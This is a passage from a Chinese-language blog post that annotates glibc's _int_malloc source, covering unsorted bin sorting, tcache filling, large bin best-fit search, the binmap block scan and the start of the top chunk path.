class="comment">//设置victim的头部</span></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        <span class="comment">//设置剩余部分的头部</span></span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        <span class="comment">//设置剩余部分的尾部</span></span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回victim</span></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      <span class="comment">//将victim移出链表</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb)<span class="comment">//如果victim的大小正好是要求的大小</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//设置标识位</span></span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          set_non_main_arena(victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">        <span class="comment">//如果tcache没满就优先把victim放入tcache，而不是返回给用户</span></span><br><span class="line">        <span class="keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">          tcache_put(victim, tc_idx);</span><br><span class="line">          return_cached = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="comment">//返回victim</span></span><br><span class="line">          check_malloced_chunk(av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">          alloc_perturb(p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//如果victim的大小在small bin的范围内就放入small bin中</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))</span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//否则就放入large bin中</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)<span class="comment">//如果large bin链表不为空</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          <span class="comment">//将PREV_INUSE置1，加速比较</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          <span class="comment">//确保bck-&gt;bk在main arena中</span></span><br><span class="line">          assert(chunk_main_arena(bck-&gt;bk));</span><br><span class="line">          <span class="comment">//如果victim比链表中的最后一个也就是最小的一个还小，就直接插入最后</span></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(bck-&gt;bk))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert(chunk_main_arena(fwd));</span><br><span class="line">            <span class="comment">//找到第一个不大于victim的chunk，即找victim的位置</span></span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size &lt; chunksize_nomask(fwd))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert(chunk_main_arena(fwd));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果victim和找到的chunk一样大就不用插入nextsize循环链表</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(fwd))</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;<span class="comment">//victim插在与之相同大小的chunk的后面</span></span><br><span class="line">            <span class="keyword">else</span> <span class="comment">//如果victim和找到的chunk不一样大就需要插入nextsize循环链表</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果large bin链表为空，直接插入，让victim的fd_nextsize和bk_nextsize都指向自己</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//利用之前找到的bck和fwd的值将victim插入循环链表中</span></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果已经将足够多的chunk放入tcache就直接从tcache中找到chunk并返回</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="comment">//wille循环最多10000次</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//while循环结束后判断是否有chunk被放进tcache，如果有就从tcache中取出chunk并返回</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">    <span class="keyword">if</span> (return_cached)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在这个遍历unsorted bin的过程中，不仅找了所需大小的chunk，还对unsorted bin中的chunk进行了整理，把他们分别分配到了各自该在的bin中，这也是给chunk找家的唯一代码。</p><p>到这里，用到tcache的地方就结束了，可以看到放入tcache中的所有chunk都是和被需要的chunk相同大小的，这是因为在很多情况下，刚被需要的内存块大小有更大的概率被继续需要，所以在tcache链未满的情况下把所有与被需要的内存块大小相同的chunk放入tcache，并在分配时优先从tcache中找，可以有效地提高内存分配的效率。</p><h3 id="large-bin2"><a href="#large-bin2" class="headerlink" title="large bin2"></a>large bin2</h3><p>large bin也在bins数组中，一共有63个，不同的是每个large bin中的chunk并不是大小相同的，而是存储一定范围的chunk，每个large bin存储的范围都不同。</p><p>查找完unsorted bin后就真正开始从large bin中找，因为large bin是有序链表，第一个最大，依次减小，所以就依次扫描链表，直到找到一个符合要求的最小chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">     sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(nb))</span><br><span class="line">&#123;</span><br><span class="line">  bin = bin_at(av, idx);<span class="comment">//idx在之前被赋值，idx = largebin_index(nb)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">  <span class="comment">//如果large bin非空并且large bin中最大的chunk不小于nb</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(victim) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb))</span><br><span class="line">  &#123;</span><br><span class="line">    victim = victim-&gt;bk_nextsize;</span><br><span class="line">    <span class="comment">//反向遍历链表，从最小的开始找，找到第一个不小于nb的chunk</span></span><br><span class="line">    <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)))</span><br><span class="line">      victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">             list does not have to be rerouted.  */</span></span><br><span class="line">    <span class="comment">//如果victim不是链表的最后一个，并且victim与之普通链上的下一个chunk大小相同</span></span><br><span class="line">    <span class="comment">//就使用下一个chunk，因为该chunk不在nextsize链上，就不用改动nextsize指针</span></span><br><span class="line">    <span class="comment">//注：前面找到的第一个不小于nb的chunk是在nextsize链上找到的，所以该chunk普通链上</span></span><br><span class="line">    <span class="comment">//的下一个chunk是有可能与之大小相同的，正如前面所说，如果插入的时候大小相同就插在后面</span></span><br><span class="line">    <span class="keyword">if</span> (victim != last(bin) &amp;&amp; chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))</span><br><span class="line">      victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;<span class="comment">//剩余部分的大小</span></span><br><span class="line">    unlink(av, victim, bck, fwd);<span class="comment">//将victim从链表中取出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="comment">//如果剩余部分不够一个chunk</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">      set_inuse_bit_at_offset(victim, size);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena(victim);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="comment">//否则就进行拆分</span></span><br><span class="line">    &#123;</span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line">      <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                 have to perform a complete insert here.  */</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      <span class="comment">//将剩余部分插到unsorted bin的第一个</span></span><br><span class="line">      remainder-&gt;bk = bck;</span><br><span class="line">      remainder-&gt;fd = fwd;</span><br><span class="line">      bck-&gt;fd = remainder;</span><br><span class="line">      fwd-&gt;bk = remainder;</span><br><span class="line">      <span class="comment">//如果属于large bin的范畴就将nextsize指针置空</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//设置标识位</span></span><br><span class="line">      set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      set_foot(remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检查并返回victim</span></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>一个block就是连续的32个bin，每个block有一个map来标记每个bin里是否有空闲的chunk，通过这种机制就可以批量地查看bin的状态，避免了挨个遍历，提高了检索速度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">        bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">        (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">        that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">        The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">        when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">   ++idx;<span class="comment">//下一个large bin</span></span><br><span class="line">   bin = bin_at(av, idx);</span><br><span class="line"><span class="comment">// #define idx2block(i) ((i) &gt;&gt; BINMAPSHIFT) </span></span><br><span class="line"><span class="comment">//BINMAPSHIFT = 5</span></span><br><span class="line"><span class="comment">//binmap用一个整数的每一个位来标识每个bin中是否有空闲的chunk</span></span><br><span class="line"><span class="comment">//因为一个int是32位，所以一个map能标识32个bin的状态，所以idx右移5位就是map的索引</span></span><br><span class="line"><span class="comment">//如100010表示第2和第6个bin中有空闲的chunk</span></span><br><span class="line">   block = idx2block(idx);</span><br><span class="line">   <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line"><span class="comment">// #define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"><span class="comment">//实际上就是把1左移idx位，但是如果idx超过31就越了int的界</span></span><br><span class="line"><span class="comment">//但是在实际执行时是1&lt;&lt;(idx%32)，如1&lt;&lt;35 == 1&lt;&lt;3 == 8</span></span><br><span class="line">   bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (;;)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">     <span class="comment">//bit&gt;map，即在当前block中大于等于(idx%32)位置上的bin都不可用</span></span><br><span class="line">     <span class="comment">//另外按照bin的排列规则，索引越大的bin，chunk越大</span></span><br><span class="line">     <span class="comment">//所以bit&gt;map表示当前block中没有可用的bin</span></span><br><span class="line">     <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">//如果当前block不可用就找下一个block，直到binmap不等于0，即找到的block中有可用bin</span></span><br><span class="line">       <span class="keyword">do</span></span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">           <span class="keyword">goto</span> use_top;<span class="comment">//如果超出了bin的范围，就使用top chunk</span></span><br><span class="line">       &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//block左移5位即idx2block的逆过程，找到当前block的第一个bin</span></span><br><span class="line">       bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">       bit = <span class="number">1</span>;<span class="comment">//表示当前使用的是第一个bin</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">     <span class="comment">//(bit &amp; map) == 0表示当前的bin不可用</span></span><br><span class="line">     <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">       bin = next_bin(bin);</span><br><span class="line">       bit &lt;&lt;= <span class="number">1</span>;<span class="comment">//左移1位表示使用下一个chunk</span></span><br><span class="line">       assert(bit != <span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">     <span class="comment">//从最后一个也就是最小的一个chunk开始</span></span><br><span class="line">     victim = last(bin);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">     <span class="comment">//如果bin是空的的话更新对应map中的bit值为0，并找下一个bin</span></span><br><span class="line">     <span class="keyword">if</span> (victim == bin)</span><br><span class="line">     &#123;</span><br><span class="line">       av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">       bin = next_bin(bin);</span><br><span class="line">       bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//如果非空就取出chunk然后跟large bin一样进行拆分拼接等操作</span></span><br><span class="line">     <span class="comment">//因为当前的bin索引比之前按照nb找到的bin的索引大，所以chunksize肯定大于nb</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">       size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">       assert((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb));</span><br><span class="line"></span><br><span class="line">       remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* unlink */</span></span><br><span class="line">       unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Exhaust */</span></span><br><span class="line">       <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">       &#123;</span><br><span class="line">         set_inuse_bit_at_offset(victim, size);</span><br><span class="line">         <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">           set_non_main_arena(victim);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Split */</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">         bck = unsorted_chunks(av);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line">         <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">           malloc_printerr(<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">         remainder-&gt;bk = bck;</span><br><span class="line">         remainder-&gt;fd = fwd;</span><br><span class="line">         bck-&gt;fd = remainder;</span><br><span class="line">         fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">           av-&gt;last_remainder = remainder;</span><br><span class="line">         <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">         &#123;</span><br><span class="line">           remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">           remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">         set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">         set_foot(remainder, remainder_size);</span><br><span class="line">       &#125;</span><br><span class="line">       check_malloced_chunk(av, victim, nb);</span><br><span class="line">       <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">       alloc_perturb(p, bytes);</span><br><span class="line">       <span class="keyword">return</span> p;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>top chunk是一个单独的chunk，位于一个arena的最顶部。当所有的bin都无法满足需求时就从top chunk中拆分chunk来满足需求，如果top chunk也无法满足需求就调用<code>sysmalloc</code>来扩展堆内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">  use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">  